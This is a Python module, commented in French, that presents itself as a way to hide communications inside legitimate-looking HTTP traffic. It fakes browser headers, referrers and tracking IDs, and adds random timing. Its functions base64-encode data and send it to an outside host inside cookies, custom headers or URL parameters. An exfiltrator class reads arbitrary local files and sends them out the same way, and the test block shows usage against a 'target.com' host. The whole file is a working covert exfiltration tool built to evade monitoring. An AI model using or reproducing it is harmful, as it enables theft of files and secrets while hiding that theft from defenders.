"""
HTTP Mimicry - Simulation de trafic HTTP légitime
Encode des données dans des requêtes HTTP qui ressemblent à du trafic normal
"""
import requests
import random
import time
import base64
import json
from typing import Dict, List, Optional
from urllib.parse import urlencode


class HTTPMimicry:
    """
    Simule du trafic HTTP légitime pour cacher des communications
    
    Techniques:
    - User-Agent rotation
    - Headers réalistes
    - Timing naturel
    - Endpoints communs
    - Données cachées dans cookies/headers
    """
    
    # User-Agents réalistes
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    ]
    
    # Referrers communs
    REFERRERS = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.yahoo.com/',
        'https://www.duckduckgo.com/',
        'https://www.reddit.com/',
        'https://news.ycombinator.com/'
    ]
    
    # Endpoints communs (pour simulation)
    COMMON_ENDPOINTS = [
        '/api/v1/status',
        '/api/v1/health',
        '/api/users',
        '/api/data',
        '/static/js/main.js',
        '/static/css/style.css',
        '/favicon.ico',
        '/robots.txt'
    ]
    
    def __init__(self, base_url: str):
        """
        Args:
            base_url: URL de base du serveur cible
        """
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
    
    def generate_realistic_headers(self) -> Dict[str, str]:
        """Génère des headers HTTP réalistes"""
        return {
            'User-Agent': random.choice(self.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': random.choice(self.REFERRERS)
        }
    
    def send_hidden_data_in_cookies(self, data: bytes, endpoint: str = '/') -> bool:
        """
        Cache des données dans des cookies HTTP
        
        Args:
            data: Données à cacher
            endpoint: Endpoint cible
        
        Returns:
            True si succès
        """
        try:
            # Encodage des données
            encoded = base64.b64encode(data).decode()
            
            # Découpage en plusieurs cookies si nécessaire
            max_cookie_size = 4000  # Limite de taille des cookies
            chunks = [encoded[i:i+max_cookie_size] for i in range(0, len(encoded), max_cookie_size)]
            
            print(f"[HTTPMimicry] Sending {len(data)} bytes in {len(chunks)} cookies")
            
            for i, chunk in enumerate(chunks):
                # Construction des cookies
                cookies = {
                    f'session_id': self._generate_fake_session_id(),
                    f'tracking_id': self._generate_tracking_id(),
                    f'data_{i}': chunk,
                    'preferences': 'dark_mode=true;lang=en'
                }
                
                # Envoi de la requête
                headers = self.generate_realistic_headers()
                url = f"{self.base_url}{endpoint}"
                
                response = self.session.get(url, headers=headers, cookies=cookies, timeout=10)
                
                print(f"[HTTPMimicry] Cookie {i+1}/{len(chunks)} sent: {response.status_code}")
                
                # Délai naturel
                time.sleep(random.uniform(0.5, 2.0))
            
            print("[HTTPMimicry] ✓ Data sent successfully")
            return True
            
        except Exception as e:
            print(f"[HTTPMimicry] Send error: {e}")
            return False
    
    def send_hidden_data_in_headers(self, data: bytes, endpoint: str = '/api/status') -> bool:
        """
        Cache des données dans des headers HTTP personnalisés
        
        Args:
            data: Données à cacher
            endpoint: Endpoint cible
        
        Returns:
            True si succès
        """
        try:
            # Encodage
            encoded = base64.b64encode(data).decode()
            
            # Headers légitimes + données cachées
            headers = self.generate_realistic_headers()
            headers['X-Request-ID'] = self._generate_request_id()
            headers['X-Client-Version'] = '2.5.1'
            headers['X-Platform'] = 'web'
            headers['X-Data'] = encoded  # Données cachées
            
            url = f"{self.base_url}{endpoint}"
            
            print(f"[HTTPMimicry] Sending {len(data)} bytes in X-Data header to {url}")
            
            response = self.session.get(url, headers=headers, timeout=10)
            
            print(f"[HTTPMimicry] Response: {response.status_code}")
            print("[HTTPMimicry] ✓ Data sent successfully")
            return True
            
        except Exception as e:
            print(f"[HTTPMimicry] Send error: {e}")
            return False
    
    def send_hidden_data_in_params(self, data: bytes, endpoint: str = '/search') -> bool:
        """
        Cache des données dans des paramètres d'URL
        
        Args:
            data: Données à cacher
            endpoint: Endpoint cible
        
        Returns:
            True si succès
        """
        try:
            # Encodage
            encoded = base64.b64encode(data).decode()
            
            # Paramètres légitimes + données cachées
            params = {
                'q': 'search query',
                'page': str(random.randint(1, 10)),
                'sort': random.choice(['date', 'relevance', 'popularity']),
                'filter': 'all',
                'token': encoded  # Données cachées
            }
            
            headers = self.generate_realistic_headers()
            url = f"{self.base_url}{endpoint}"
            
            print(f"[HTTPMimicry] Sending {len(data)} bytes in URL params to {url}")
            
            response = self.session.get(url, headers=headers, params=params, timeout=10)
            
            print(f"[HTTPMimicry] Response: {response.status_code}")
            print("[HTTPMimicry] ✓ Data sent successfully")
            return True
            
        except Exception as e:
            print(f"[HTTPMimicry] Send error: {e}")
            return False
    
    def simulate_browsing_session(self, num_requests: int = 5, data_to_exfiltrate: Optional[bytes] = None):
        """
        Simule une session de navigation réaliste
        
        Args:
            num_requests: Nombre de requêtes à générer
            data_to_exfiltrate: Données optionnelles à exfiltrer
        """
        print(f"[HTTPMimicry] Simulating browsing session ({num_requests} requests)")
        
        for i in range(num_requests):
            # Sélection aléatoire d'un endpoint
            endpoint = random.choice(self.COMMON_ENDPOINTS)
            
            # Headers réalistes
            headers = self.generate_realistic_headers()
            
            url = f"{self.base_url}{endpoint}"
            
            try:
                # Requête
                response = self.session.get(url, headers=headers, timeout=10)
                
                print(f"[HTTPMimicry] [{i+1}/{num_requests}] GET {endpoint}: {response.status_code}")
                
                # Si données à exfiltrer sur une requête aléatoire
                if data_to_exfiltrate and random.random() < 0.3:  # 30% de chance
                    self.send_hidden_data_in_cookies(data_to_exfiltrate, endpoint)
                
            except Exception as e:
                print(f"[HTTPMimicry] Request failed: {e}")
            
            # Délai réaliste entre requêtes
            delay = random.uniform(1.0, 5.0)
            time.sleep(delay)
        
        print("[HTTPMimicry] ✓ Browsing session complete")
    
    def _generate_fake_session_id(self) -> str:
        """Génère un faux ID de session réaliste"""
        return base64.b64encode(random.randbytes(24)).decode()
    
    def _generate_tracking_id(self) -> str:
        """Génère un ID de tracking réaliste"""
        return f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}"
    
    def _generate_request_id(self) -> str:
        """Génère un ID de requête réaliste (UUID-like)"""
        import uuid
        return str(uuid.uuid4())


class HTTPExfiltrator:
    """Classe d'aide pour exfiltration via HTTP mimicry"""
    
    @staticmethod
    def exfiltrate_text(text: str, base_url: str, method: str = 'cookies') -> bool:
        """
        Exfiltre du texte via HTTP mimicry
        
        Args:
            text: Texte à exfiltrer
            base_url: URL de base
            method: Méthode (cookies, headers, params)
        
        Returns:
            True si succès
        """
        mimicry = HTTPMimicry(base_url)
        data = text.encode()
        
        if method == 'cookies':
            return mimicry.send_hidden_data_in_cookies(data)
        elif method == 'headers':
            return mimicry.send_hidden_data_in_headers(data)
        elif method == 'params':
            return mimicry.send_hidden_data_in_params(data)
        else:
            print(f"[HTTPExfiltrator] Unknown method: {method}")
            return False
    
    @staticmethod
    def exfiltrate_file(file_path: str, base_url: str, method: str = 'cookies') -> bool:
        """
        Exfiltre un fichier via HTTP mimicry
        
        Args:
            file_path: Chemin du fichier
            base_url: URL de base
            method: Méthode
        
        Returns:
            True si succès
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            return HTTPExfiltrator.exfiltrate_text(data.decode('latin-1'), base_url, method)
            
        except Exception as e:
            print(f"[HTTPExfiltrator] Failed: {e}")
            return False


if __name__ == '__main__':
    # Test du HTTP Mimicry
    print("=== HTTP Mimicry Test ===\n")
    
    # Configuration
    mimicry = HTTPMimicry('https://httpbin.org')
    
    # Test 1: Génération de headers
    print("1. Testing realistic header generation...")
    headers = mimicry.generate_realistic_headers()
    print("Generated headers:")
    for key, value in list(headers.items())[:3]:
        print(f"  {key}: {value[:50]}...")
    
    # Test 2: Simulation de session
    print("\n2. Testing browsing session simulation...")
    print("Note: Using httpbin.org for testing (some endpoints may 404)\n")
    
    mimicry.simulate_browsing_session(num_requests=3)
    
    # Test 3: Exfiltration de données
    print("\n3. Testing data exfiltration...")
    test_data = b"Secret data to exfiltrate"
    
    try:
        success = mimicry.send_hidden_data_in_headers(test_data, '/get')
        if success:
            print("✓ Data exfiltration successful")
    except Exception as e:
        print(f"Note: {e}")
    
    print("\n✓ Test complete")
    print("\nUsage examples:")
    print("  mimicry = HTTPMimicry('https://target.com')")
    print("  mimicry.send_hidden_data_in_cookies(data, '/api/status')")
    print("  mimicry.simulate_browsing_session(num_requests=10, data_to_exfiltrate=secret)")
